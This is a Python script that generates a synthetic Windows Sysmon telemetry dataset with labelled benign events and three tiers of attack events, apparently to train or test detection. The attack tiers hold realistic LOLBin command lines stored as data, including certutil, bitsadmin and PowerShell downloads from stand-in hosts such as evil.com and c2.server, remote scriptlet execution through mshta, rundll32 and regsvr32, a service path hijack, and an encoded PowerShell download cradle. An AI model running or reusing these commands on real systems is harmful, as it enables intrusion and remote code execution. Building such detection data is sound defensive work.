#!/usr/bin/env python3
"""
generate_sysmon_dataset.py
==========================
Generates a realistic Windows Sysmon telemetry dataset (data/sysmon.json)
containing EventID 1 (Process Creation) and EventID 11 (File Creation) records
across Benign Baseline and Attack Tiers (1, 2, 3).
"""

import os
import json
import uuid
import random
from datetime import datetime, timedelta, timezone

def generate_sysmon_dataset(output_path="data/sysmon.json", num_benign=600):
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    random.seed(42)

    base_time = datetime(2026, 10, 20, 8, 0, 0, tzinfo=timezone.utc)
    cur_time = base_time

    def next_ts(step_secs=5):
        nonlocal cur_time
        cur_time += timedelta(seconds=random.randint(1, step_secs))
        return cur_time.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

    events = []

    # --------------------------------------------------------------------------
    # 1. BENIGN BASELINE EVENTS (EventID 1 & EventID 11)
    # --------------------------------------------------------------------------
    benign_templates = [
        # LOLBin legitimate usage
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil.exe -dump C:\\Certs\\ca.crt", "C:\\Windows\\System32\\svchost.exe", 1044, "Medium", "CORP\\alice"),
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil.exe -hashfile C:\\Windows\\System32\\notepad.exe SHA256", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\bob"),
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil.exe -verify C:\\Certs\\server.cer", "C:\\Windows\\System32\\svchost.exe", 1044, "Medium", "CORP\\alice"),
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoProfile -Command Get-Service | Where-Object {$_.Status -eq 'Running'}", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\alice"),
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-Date", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\bob"),
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -Command Get-Process | Sort-Object CPU -Descending | Select-Object -First 10", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\admin_ops"),
        ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\bob"),
        ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe user32.dll,LockWorkStation", "C:\\Windows\\System32\\svchost.exe", 1044, "Medium", "CORP\\alice"),
        ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s C:\\Windows\\System32\\msxml6.dll", "C:\\Windows\\System32\\msiexec.exe", 1820, "Medium", "CORP\\alice"),
        ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s \"C:\\Program Files\\Common Files\\System\\ole db\\oledb32.dll\"", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\bob"),
        ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "mshta.exe C:\\Windows\\System32\\msinfo32.hta", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\admin_ops"),
        ("wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic.exe os get Caption,Version,BuildNumber /format:list", "C:\\Windows\\System32\\cmd.exe", 3120, "Medium", "CORP\\admin_ops"),
        ("robocopy.exe", "C:\\Windows\\System32\\robocopy.exe", "robocopy C:\\Projects C:\\Backup\\Projects /MIR /R:1 /W:1", "C:\\Windows\\System32\\cmd.exe", 3120, "Medium", "CORP\\alice"),
        ("git.exe", "C:\\Program Files\\Git\\cmd\\git.exe", "git.exe status", "C:\\Windows\\explorer.exe", 2048, "Medium", "CORP\\alice"),
        ("ipconfig.exe", "C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all", "C:\\Windows\\System32\\cmd.exe", 3120, "Medium", "CORP\\bob"),
        ("ping.exe", "C:\\Windows\\System32\\ping.exe", "ping.exe -n 4 8.8.8.8", "C:\\Windows\\System32\\cmd.exe", 3120, "Medium", "CORP\\bob"),
        ("tasklist.exe", "C:\\Windows\\System32\\tasklist.exe", "tasklist /v", "C:\\Windows\\System32\\cmd.exe", 3120, "Medium", "CORP\\admin_ops"),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k LocalService -p -s EventLog", "C:\\Windows\\System32\\services.exe", 650, "System", "NT AUTHORITY\\SYSTEM")
    ]

    for i in range(num_benign):
        tmpl = random.choice(benign_templates)
        proc_name, image, cmd, parent_img, ppid, integ, user = tmpl
        pid = random.randint(3000, 45000)
        ts = next_ts(8)

        # EventID 1: Process Creation
        ev1 = {
            "EventID": 1,
            "UtcTime": ts,
            "ProcessGuid": f"{{{uuid.uuid4()}}}",
            "ProcessId": pid,
            "Image": image,
            "CommandLine": cmd,
            "CurrentDirectory": "C:\\Windows\\System32\\" if "svchost" in parent_img else "C:\\Users\\Administrator\\",
            "User": user,
            "IntegrityLevel": integ,
            "ParentProcessId": ppid,
            "ParentImage": parent_img,
            "ParentCommandLine": parent_img,
            "label": "benign",
            "tier": 0,
            "technique": "Benign Windows User / Admin Activity",
            "mitre_technique_id": "None"
        }
        events.append(ev1)

        # Occasional benign file creation (EventID 11) e.g., backup or temp log
        if random.random() < 0.15:
            ev11 = {
                "EventID": 11,
                "UtcTime": next_ts(2),
                "ProcessGuid": f"{{{uuid.uuid4()}}}",
                "ProcessId": pid,
                "Image": image,
                "TargetFilename": f"C:\\Users\\Administrator\\AppData\\Local\\Temp\\log_{i}.tmp",
                "User": user,
                "IntegrityLevel": integ,
                "label": "benign",
                "tier": 0,
                "technique": "Benign File Creation",
                "mitre_technique_id": "None"
            }
            events.append(ev11)

    # --------------------------------------------------------------------------
    # 2. TIER 1: OVERT LOLBIN ATTACKS (EventID 1 & 11)
    # --------------------------------------------------------------------------
    tier1_attacks = [
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://evil.com/nc.exe C:\\Users\\Public\\nc.exe", "C:\\Users\\Public\\nc.exe", "Certutil Ingress Tool Transfer", "T1105"),
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command (New-Object Net.WebClient).DownloadFile('http://10.0.0.5/shell.exe','C:\\Windows\\Temp\\shell.exe')", "C:\\Windows\\Temp\\shell.exe", "PowerShell Tool Download", "T1059.001"),
        ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "mshta.exe javascript:a=GetObject('script:http://10.0.0.5/payload.sct').Exec()", "", "Mshta Remote Scriptlet Execution", "T1218.005"),
        ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://evil.corp/a.sct\");", "", "Rundll32 Scriptlet Proxy Execution", "T1218.011"),
        ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll", "", "Regsvr32 Squiblydoo Scriptlet Abuse", "T1218.010"),
        ("bitsadmin.exe", "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin.exe /transfer myDownloadJob /download /priority high http://evil.com/agent.exe C:\\Users\\Public\\agent.exe", "C:\\Users\\Public\\agent.exe", "Bitsadmin Ingress Transfer", "T1197"),
        ("wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic.exe process call create \"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...\"", "", "WMIC Process Call Create Execution", "T1047")
    ]

    for proc, img, cmd, target_file, tech, mitre in tier1_attacks:
        pid = random.randint(50000, 60000)
        ts = next_ts(10)
        events.append({
            "EventID": 1,
            "UtcTime": ts,
            "ProcessGuid": f"{{{uuid.uuid4()}}}",
            "ProcessId": pid,
            "Image": img,
            "CommandLine": cmd,
            "CurrentDirectory": "C:\\Users\\Administrator\\",
            "User": "CORP\\victim",
            "IntegrityLevel": "High",
            "ParentProcessId": 3120,
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "label": "malicious",
            "tier": 1,
            "technique": tech,
            "mitre_technique_id": mitre
        })
        if target_file:
            events.append({
                "EventID": 11,
                "UtcTime": next_ts(1),
                "ProcessGuid": f"{{{uuid.uuid4()}}}",
                "ProcessId": pid,
                "Image": img,
                "TargetFilename": target_file,
                "User": "CORP\\victim",
                "IntegrityLevel": "High",
                "label": "malicious",
                "tier": 1,
                "technique": tech + " (Payload Dropped)",
                "mitre_technique_id": mitre
            })

    # --------------------------------------------------------------------------
    # 3. TIER 2: MULTI-STEP ATTACK CHAINS (Recon -> Download -> Escalate)
    # --------------------------------------------------------------------------
    chain_steps = [
        # Chain 1: Discovery -> Download -> Impersonation
        [
            ("whoami.exe", "C:\\Windows\\System32\\whoami.exe", "whoami /priv", "Discovery: Token Privileges", "T1033"),
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://c2.server/privesc.exe C:\\Users\\Public\\privesc.exe", "Ingress Tool Transfer", "T1105"),
            ("privesc.exe", "C:\\Users\\Public\\privesc.exe", "C:\\Users\\Public\\privesc.exe --impersonate-system", "Token Impersonation PrivEsc", "T1134")
        ],
        # Chain 2: Service Config -> Payload Staging -> Service Start
        [
            ("sc.exe", "C:\\Windows\\System32\\sc.exe", "sc.exe config VulnerableService binPath= \"C:\\Users\\Public\\evil.exe\"", "Service Binary Path Modification", "T1543.003"),
            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://c2.server/evil.exe','C:\\Users\\Public\\evil.exe')", "Download Backdoor", "T1059.001"),
            ("sc.exe", "C:\\Windows\\System32\\sc.exe", "sc.exe start VulnerableService", "Service Execution", "T1543.003")
        ]
    ]

    for chain in chain_steps:
        chain_sess = f"win_attack_chain_{uuid.uuid4().hex[:6]}"
        for proc, img, cmd, tech, mitre in chain:
            pid = random.randint(61000, 68000)
            events.append({
                "EventID": 1,
                "UtcTime": next_ts(5),
                "ProcessGuid": f"{{{uuid.uuid4()}}}",
                "ProcessId": pid,
                "Image": img,
                "CommandLine": cmd,
                "CurrentDirectory": "C:\\Users\\Administrator\\",
                "User": "CORP\\compromised_user",
                "IntegrityLevel": "High" if "impersonate" in cmd or "start" in cmd else "Medium",
                "ParentProcessId": 3120,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "session_id": chain_sess,
                "label": "malicious",
                "tier": 2,
                "technique": tech,
                "mitre_technique_id": mitre
            })

    # --------------------------------------------------------------------------
    # 4. TIER 3: OBFUSCATED LOLBINS
    # --------------------------------------------------------------------------
    tier3_attacks = [
        ("cmd.exe", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c \"set p=certutil&& call %p% -urlcache -split -f http://c2.site/sh.exe C:\\Users\\Public\\sh.exe\"", "Obfuscated Environment Variable Aliasing", "T1027.010"),
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAnACkA", "Base64 Encoded PowerShell LOLBin", "T1027"),
        ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -w hidden IEX(New-Object Net.WebClient).DownloadString(''http://c2.io/p'')\"\",0,True\")(window.close)", "Obfuscated Inline VBScript Mshta", "T1218.005")
    ]

    for proc, img, cmd, tech, mitre in tier3_attacks:
        pid = random.randint(70000, 79000)
        events.append({
            "EventID": 1,
            "UtcTime": next_ts(12),
            "ProcessGuid": f"{{{uuid.uuid4()}}}",
            "ProcessId": pid,
            "Image": img,
            "CommandLine": cmd,
            "CurrentDirectory": "C:\\Users\\Administrator\\",
            "User": "CORP\\attacker",
            "IntegrityLevel": "High",
            "ParentProcessId": 3120,
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "label": "malicious",
            "tier": 3,
            "technique": tech,
            "mitre_technique_id": mitre
        })

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(events, f, indent=2)

    print(f"[+] Successfully generated {len(events)} Sysmon events at: {output_path}")

if __name__ == "__main__":
    generate_sysmon_dataset()
